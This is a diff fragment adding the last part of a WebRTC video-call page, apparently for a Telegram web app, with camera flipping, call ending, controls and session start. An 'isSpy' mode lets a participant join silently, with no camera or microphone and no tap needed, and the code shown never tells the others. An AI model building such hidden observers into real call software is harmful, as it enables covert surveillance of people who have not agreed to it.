+                // Fallback to non-exact if device doesn't perfectly match 'exact' constraint
+                newStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
+                });
+            }
+
+            const newTrack = newStream.getVideoTracks()[0];
+
+            // Stop and remove old track
+            const oldTrack = localStream.getVideoTracks()[0];
+            if (oldTrack) {
+                oldTrack.stop();
+                localStream.removeTrack(oldTrack);
+            }
+
+            // Add new track
+            localStream.addTrack(newTrack);
+
+            // Update local UI
+            localVid.srcObject = null;
+            localVid.srcObject = localStream;
+            localVid.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
+
+            // Update all WebRTC peers
+            Object.values(pcMap).forEach(pc => {
+                const sender = pc.getSenders().find(s => s.track && s.track.kind === 'video');
+                if (sender) {
+                    sender.replaceTrack(newTrack).catch(err => log(`Replace track err: ${err.message}`));
+                }
+            });
+            log(`Camera flipped to: ${facingMode}`);
+        } catch (e) {
+            log(`Flip error: ${e.name}`);
+            // Revert facing mode if it failed
+            facingMode = facingMode === 'user' ? 'environment' : 'user';
+        } finally {
+            isFlipping = false;
+        }
+    }
+    function endCall() {
+        Object.values(pcMap).forEach(p => p.close());
+        if (localStream) localStream.getTracks().forEach(t => t.stop());
+
+        // Broadcast room_ended manually before closing socket
+        wsSend({ type: 'room_ended' });
+        if (ws) ws.close();
+
+        stopTimer();
+        endedEl.classList.add('show');
+
+        setTimeout(() => {
+            try {
+                if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initData) {
+                    window.Telegram.WebApp.close();
+                }
+            } catch (e) { }
+
+            // Fallbacks to aggressively close standard browser tabs
+            window.close();
+            window.location.href = "about:blank";
+
+            // If it still won't close, try going back
+            setTimeout(() => window.history.back(), 500);
+        }, 1200);
+    }
+
+    // ── Dock render ──────────────────────────────────────────
+    function renderDock() {
+        const di = document.getElementById('di');
+        if (isSpy) {
+            di.innerHTML = `<span style="font-size:11px;font-weight:700;letter-spacing:.09em;color:rgba(255,59,92,.9);text-transform:uppercase">👁 SPY</span>`;
+            return;
+        }
+        di.outerHTML = `
+    <button class="btn" id="btn-flip" onclick="flipCam()">
+      <svg viewBox="0 0 24 24"><path d="M21.16 7.42a10 10 0 0 0-17.74-2.84"/><path d="M3 3v5h5"/><path d="M2.84 16.58a10 10 0 0 0 17.74 2.84"/><path d="M21 21v-5h-5"/></svg>
+    </button>
+    <button class="btn" id="btn-cam" onclick="toggleCam()">
+      <svg viewBox="0 0 24 24"><path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"/><circle cx="12" cy="13" r="3"/></svg>
+    </button>
+    <button class="btn" id="btn-mic" onclick="toggleMic()">
+      <svg viewBox="0 0 24 24"><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" x2="12" y1="19" y2="22"/></svg>
+    </button>
+    <button class="btn btn-end" onclick="endCall()">
+      <svg viewBox="0 0 24 24"><path d="M10.68 13.31a16 16 0 0 0 3.41 2.6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7 2 2 0 0 1 1.72 2v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.42 19.42 0 0 1-3.33-2.67m-2.67-3.34a19.79 19.79 0 0 1-3.07-8.63A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91"/><line x1="22" x2="2" y1="2" y2="22"/></svg>
+    </button>
+  `;
+        addRipple(document.getElementById('btn-mic'));
+        addRipple(document.getElementById('btn-cam'));
+        addRipple(document.getElementById('btn-flip'));
+        addRipple(document.querySelector('.btn-end'));
+    }
+
+    // ── Retry logic ──────────────────────────────────────────
+    let retryT = null;
+    function clearRetryTimer() {
+        if (retryT) clearTimeout(retryT);
+        retryT = null;
+    }
+    // Instead of a global timer, let the ICE candidate state handle retries
+    // But we add a catch-all if stuck in checking for > 15s
+    function checkStuck() {
+        if (Object.keys(pcMap).length > 0 && hchip.classList.contains('connecting')) {
+            Object.values(pcMap).forEach(pc => {
+                if (pc.iceConnectionState === 'checking') pc.restartIce();
+            });
+        }
+    }
+    setInterval(checkStuck, 15000);
+
+    // ── Draggable PiP ─────────────────────────────────────────
+    function draggable(el) {
+        let sx, sy, ox, oy, ok = false;
+        const go = (x, y) => { ok = true; sx = x; sy = y; ox = el.offsetLeft; oy = el.offsetTop; el.style.transition = 'none' };
+        const mv = (x, y) => {
+            if (!ok) return;
+            el.style.left = Math.max(8, Math.min(ox + x - sx, innerWidth - el.offsetWidth - 8)) + 'px';
+            el.style.top = Math.max(8, Math.min(oy + y - sy, innerHeight - el.offsetHeight - 8)) + 'px';
+            el.style.right = 'auto';
+        };
+        const stop = () => ok = false;
+        el.addEventListener('mousedown', e => go(e.clientX, e.clientY));
+        window.addEventListener('mousemove', e => mv(e.clientX, e.clientY));
+        window.addEventListener('mouseup', stop);
+        el.addEventListener('touchstart', e => { const t = e.touches[0]; go(t.clientX, t.clientY); }, { passive: true });
+        window.addEventListener('touchmove', e => { if (!ok) return; const t = e.touches[0]; mv(t.clientX, t.clientY); e.preventDefault(); }, { passive: false });
+        window.addEventListener('touchend', stop);
+    }
+
+    // ── Auto-hide UI (WA style) ──────────────────────────────
+    let hideT;
+    function showUI() { hudEl.classList.remove('hide'); dockEl.classList.remove('hide'); }
+    function schedHide() { clearTimeout(hideT); hideT = setTimeout(() => { hudEl.classList.add('hide'); dockEl.classList.add('hide'); }, 4500); }
+    ['touchstart', 'mousedown', 'mousemove'].forEach(ev =>
+        document.addEventListener(ev, () => { showUI(); schedHide(); }, { passive: true }));
+
+    // ── Session start (called on tap — secures user gesture) ─
+    async function startSession() {
+        document.getElementById('splash').style.display = 'none';
+        renderDock();
+
+        log("Starting Session...");
+
+        // 2. Pre-play DURING user gesture window — UNLOCKS future audio.play() calls
+        remoteVid.play().catch(() => { });
+        remoteAud.play().catch(() => { });
+
+        // 3. Request Media (ONLY if not spy)
+        if (!isSpy) {
+            try {
+                log("Requesting Camera...");
+                localStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: true
+                });
+                localVid.srcObject = localStream;
+                localVid.play().catch(() => { });
+                log("Camera active.");
+            } catch (err) {
+                log(`Media Error: ${err.name}`);
+                try {
+                    localStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    camOff.classList.add('show');
+                } catch (e) { log("Mic access denied."); }
+            }
+        }
+
+        connectWS(); schedHide();
+    }
+
+    addRipple(document.getElementById('sp-btn'));
+    if (isSpy) startSession();
+</script>
+</body>
+
+</html>
